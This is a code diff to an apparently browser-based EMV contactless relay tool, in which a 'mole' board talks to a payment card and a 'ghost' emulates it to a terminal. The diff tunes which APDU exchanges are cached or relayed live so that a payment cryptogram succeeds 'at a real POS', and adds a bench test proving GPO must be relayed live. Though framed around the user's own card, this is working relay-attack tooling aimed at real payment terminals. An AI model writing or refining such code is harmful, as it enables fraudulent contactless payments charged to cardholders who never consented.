@@ -18,7 +18,7 @@
  */
 'use strict';
 
-const BUILD = '2026-09-08u stall-diagnosis';   // shown in the log so you can confirm which version loaded
+const BUILD = '2026-09-08v payment-safe-cache';   // shown in the log so you can confirm which version loaded
 
 // --- Nordic UART Service (verified in firmware ble_main.c / ble_nus) ---------
 const NUS_SERVICE = '6e400001-b5a3-f393-e0a9-e50e24dcca9e';
@@ -151,8 +151,15 @@ function sw9000(r) { return r && r.length >= 2 && r[r.length - 2] === 0x90 && r[
 
 // Pre-read the card's STATIC EMV flow over the mole session and return cmd->resp
 // pairs to load into the ghost. Relays are live (M.relayApdu); the returned pairs
-// are what the ghost then serves instantly. GENERATE AC / a real-PDOL GPO are NOT
-// cached (their bytes won't match), so they fall through to live relay per tap.
+// are what the ghost then serves instantly.
+//
+// PAYMENT-SAFE HYBRID: we traverse SELECT and GPO (to reach the records) but DO
+// NOT cache them — they are STATE-CRITICAL. At a real POS the terminal's GPO
+// carries real data and the card computes session state from it; serving a cached
+// SELECT/GPO would leave the card out of sync so the live GENERATE AC fails (6D00/
+// 6985). So SELECT + GPO + GENERATE AC fall through to LIVE relay every tap; only
+// the truly-static, non-state-advancing reads (PPSE, READ RECORD, GET DATA) are
+// cached. (Verified on-card by the cache-safety test: records cacheable, GPO not.)
 async function buildStaticCache(M) {
   const pairs = [];
   const PPSE = hexToBytes('00A404000E325041592E5359532E444446303100');
@@ -160,7 +167,7 @@ async function buildStaticCache(M) {
   const rly = async (apdu) => { try { const r = await M.relayApdu(apdu); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
   const fci = await rly(PPSE);
   if (!(fci.length > 2)) { log('cache: PPSE relay failed — skipping cache', 'warn'); return pairs; }
-  pairs.push({ cmd: PPSE, resp: fci });
+  pairs.push({ cmd: PPSE, resp: fci });   // PPSE = static directory, safe to cache
   // dedupe AIDs (a PPSE can list the same AID twice) so we don't waste cache slots
   const seenAid = new Set();
   const aids = parseAids(fci).filter(a => { const h = hxc(a); if (seenAid.has(h)) return false; seenAid.add(h); return true; });
@@ -169,11 +176,12 @@ async function buildStaticCache(M) {
     const sel = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
     const sr = await rly(sel);
     if (!sw9000(sr)) { log(`cache: SELECT ${hxc(aid)} -> skip`, 'warn'); continue; }
-    pairs.push({ cmd: sel, resp: sr });
+    // NOT cached: SELECT is state-critical (the card must actually receive it live).
     const gpo = hexToBytes('80A8000002830000');
     const gr = await rly(gpo);
     if (sw9000(gr)) {
-      pairs.push({ cmd: gpo, resp: gr });
+      // NOT cached: GPO is state-critical + dynamic at a real POS. We only relay it
+      // here to read the AFL so we know which records to cache.
       for (const { sfi, r1, r2 } of parseAfl(gr)) {
         for (let rec = r1; rec <= r2 + 1; rec++) {
           const rr = u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00]);
@@ -1305,6 +1313,65 @@ async function testPayment() {
   log('payment test done.', 'ok');
 }
 
+// Cache-safety bench test (mole-direct, no POS). Proves which EMV steps are
+// STATE-CRITICAL — i.e. which ones a real-POS payment needs LIVE and therefore
+// cannot be served from the static cache. Runs three passes on YOUR card:
+//   baseline  : SELECT->GPO->READ->GENERATE AC live, in order   (expect cryptogram)
+//   hybrid A  : cache PPSE+SELECT+GPO, relay only GENERATE AC    (card fresh)
+//   hybrid B  : SELECT live, cache GPO (skip), relay GENERATE AC
+// If GENERATE AC fails whenever GPO wasn't live, caching GPO breaks payment.
+async function testCacheSafety() {
+  if (running) { log('stop the relay first, then Test cache-safety', 'warn'); return; }
+  if (!mole.connected) { log('connect the mole board first', 'warn'); return; }
+  const M = mole;
+  const apdu = async (b) => { try { const r = await M.relayApdu(b); return r.status === ST.HF_TAG_OK ? r.data : new Uint8Array(0); } catch (_) { return new Uint8Array(0); } };
+  const swOf = (d) => d.length >= 2 ? hxc(d.slice(-2)) : '(no response)';
+  const crypto_ = (d) => d.length > 2 && sw9000(d);
+  const reopen = async () => { try { await M.relayStop(); } catch (_) {} for (let k = 0; k < 15; k++) { try { const r = await M.relayStart(); if (r.status === ST.HF_TAG_OK && r.parsed && r.parsed.ats.length) return true; } catch (_) {} await sleep(250); } return false; };
+  try { await M.changeMode(true); } catch (_) {}
+  log('cache-safety test: proves which EMV steps must be LIVE (uncacheable) at a real POS. Mole-direct, no POS. Card on mole.', 'ok');
+  if (!(await reopen())) { log('cache-safety: no card on the mole', 'warn'); return; }
+  // Discover a working AID + its CDOL1 via one correct live pass (the baseline).
+  const fci = await apdu(hexToBytes('00A404000E325041592E5359532E444446303100'));
+  let aid = null, cdol1 = null, baseCrypto = false;
+  for (const a of parseAids(fci)) {
+    const sel = await apdu(concat(u8([0x00, 0xa4, 0x04, 0x00, a.length]), a, u8([0x00])));
+    if (!sw9000(sel)) continue;
+    const pdol = tlvFind(sel, 0x9f38)[0];
+    const gpoData = pdol ? concat(u8([0x83]), u8([buildDol(pdol).length]), buildDol(pdol)) : hexToBytes('8300');
+    const gpo = await apdu(concat(u8([0x80, 0xa8, 0x00, 0x00, gpoData.length]), gpoData, u8([0x00])));
+    if (!sw9000(gpo)) continue;
+    for (const { sfi, r1, r2 } of parseAfl(gpo)) for (let rec = r1; rec <= r2; rec++) { const rd = await apdu(u8([0x00, 0xb2, rec, (sfi << 3) | 0x04, 0x00])); const c = tlvFind(rd, 0x8c)[0]; if (c) cdol1 = c; }
+    if (!cdol1) continue;
+    const ac = await apdu(concat(u8([0x80, 0xae, 0x80, 0x00, buildDol(cdol1).length]), buildDol(cdol1), u8([0x00])));
+    aid = a; baseCrypto = crypto_(ac);
+    log(`baseline (all live, in order) on ${hxc(a)}: GENERATE AC → ${baseCrypto ? 'CRYPTOGRAM ✓' : swOf(ac)}`, baseCrypto ? 'ok' : 'warn');
+    break;
+  }
+  if (!aid || !cdol1) { log('cache-safety: this card never reached GENERATE AC live — try a payment card that does (voucher/Bancontact work).', 'warn'); try { await M.relayStop(); } catch (_) {} return; }
+  const genacCmd = concat(u8([0x80, 0xae, 0x80, 0x00, buildDol(cdol1).length]), buildDol(cdol1), u8([0x00]));
+  const selCmd = concat(u8([0x00, 0xa4, 0x04, 0x00, aid.length]), aid, u8([0x00]));
+  // Hybrid A: everything cached except GENERATE AC (card fresh, never selected).
+  await reopen();
+  const hbA = await apdu(genacCmd);
+  log(`hybrid A — cache PPSE+SELECT+GPO, relay only GENERATE AC (card never selected): GENERATE AC → ${swOf(hbA)} ${crypto_(hbA) ? '✓' : '✗'}`, crypto_(hbA) ? 'ok' : 'warn');
+  // Hybrid B: SELECT live, GPO cached (skipped), GENERATE AC live — the exact
+  // "cached GPO" case the portal's prefill would produce at a real POS.
+  await reopen();
+  const selB = await apdu(selCmd);
+  const hbB = await apdu(genacCmd);
+  log(`hybrid B — SELECT live, cache GPO (skipped), relay GENERATE AC: SELECT→${swOf(selB)}, GENERATE AC→${swOf(hbB)} ${crypto_(hbB) ? '✓' : '✗'}`, crypto_(hbB) ? 'ok' : 'warn');
+  // Verdict.
+  if (baseCrypto && !crypto_(hbB))
+    log(`VERDICT: GPO is STATE-CRITICAL — cryptogram ONLY with a live GPO; a cached/skipped GPO gives ${swOf(hbB)} at GENERATE AC. ⇒ caching GPO BREAKS a real-POS payment. Cache OFF for payment; caching only static reads (PPSE/SELECT/records) with a live GPO+GENERATE AC is the sound design.`, 'warn');
+  else if (baseCrypto && crypto_(hbB))
+    log('VERDICT: this card produced a cryptogram even without a live GPO — unusual (some cards are lax). Caching GPO happened to be tolerated here, but is NOT safe in general.', 'warn');
+  else
+    log('VERDICT: inconclusive — baseline did not reach a cryptogram; re-run with a card that completes GENERATE AC.', 'warn');
+  try { await M.relayStop(); } catch (_) {}
+  log('cache-safety test done.', 'ok');
+}
+
 // RRP-capability readout for YOUR OWN card: read each AID's AIP (Relay Resistance
 // bit) and probe EXCHANGE RELAY RESISTANCE DATA (80 EA). Tells you whether the card
 // is relay-hardened. Diagnostic only; run with the card on the mole, relay stopped.
@@ -1358,6 +1425,7 @@ window.addEventListener('DOMContentLoaded', () => {
   $('clearcache-btn').onclick = clearCache;
   if ($('rrp-btn')) $('rrp-btn').onclick = checkRRP;
   if ($('genac-btn')) $('genac-btn').onclick = testPayment;
+  if ($('cachesafe-btn')) $('cachesafe-btn').onclick = testCacheSafety;
   if ($('readers-btn')) $('readers-btn').onclick = toggleReaders;
   if ($('export-btn')) $('export-btn').onclick = exportData;
   if ($('readers-panel')) $('readers-panel').addEventListener('click', e => {
